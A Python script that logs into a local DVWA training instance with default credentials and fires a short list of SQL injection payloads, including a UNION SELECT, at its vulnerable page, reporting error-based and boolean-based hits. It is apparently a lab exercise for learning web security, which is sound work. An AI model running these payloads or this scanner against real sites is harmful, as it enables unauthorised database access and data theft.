import requests
from bs4 import BeautifulSoup

# Configuration
LOGIN_URL = "http://localhost/login.php"
TARGET_URL = "http://localhost/vulnerabilities/sqli/"

# Payloads to test
# These are standard SQL injection strings that try to confuse the database.
PAYLOADS = [
    "'", 
    "' OR '1'='1", 
    "' OR '1'='1' #", 
    "' UNION SELECT null, version() #"
]

USERNAME = "admin"
PASSWORD = "password"

session = requests.Session()

def login():
    """Logs into DVWA."""
    print(f"[*] Logging in to {LOGIN_URL}...")
    try:
        response = session.get(LOGIN_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        user_token = soup.find("input", {"name": "user_token"})['value']
        
        login_data = {
            "username": USERNAME,
            "password": PASSWORD,
            "Login": "Login",
            "user_token": user_token
        }
        
        response = session.post(LOGIN_URL, data=login_data)
        if "Welcome to Damn Vulnerable Web Application" in response.text:
            print("[+] Login Successful!")
            return True
        else:
            print("[-] Login Failed.")
            return False
    except Exception as e:
        print(f"[-] Error during login: {e}")
        return False

def test_sqli():
    """Injects payloads into the ID field."""
    print(f"\n[*] Starting SQL Injection scan on: {TARGET_URL}")
    
    for payload in PAYLOADS:
        # We construct the URL with the malicious payload in the 'id' parameter
        # equivalent to: http://localhost/vulnerabilities/sqli/?id=' OR '1'='1&Submit=Submit
        params = {
            "id": payload,
            "Submit": "Submit"
        }
        
        print(f"    [TEST] Testing payload: {payload}")
        
        # Send the attack
        response = session.get(TARGET_URL, params=params)
        
        # Analyze Response
        # In DVWA 'Low', a successful attack usually dumps all user names (admin, gordonb, etc.)
        # Or it might show a MySQL syntax error.
        
        if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
            print(f"       [!!!] VULNERABILITY FOUND (Error Based): {payload}")
            print(f"       -> Server exposed a database error.")
            
        elif "First name: admin" in response.text and "First name: Gordon" in response.text:
            # If we see multiple users, it means ' OR '1'='1 worked!
            print(f"       [!!!] VULNERABILITY FOUND (Boolean Based): {payload}")
            print(f"       -> Attack successful! Database dumped multiple records.")
            return # Stop after finding one success
            
        else:
            print("       [-] Payload failed.")

if __name__ == "__main__":
    if login():
        test_sqli()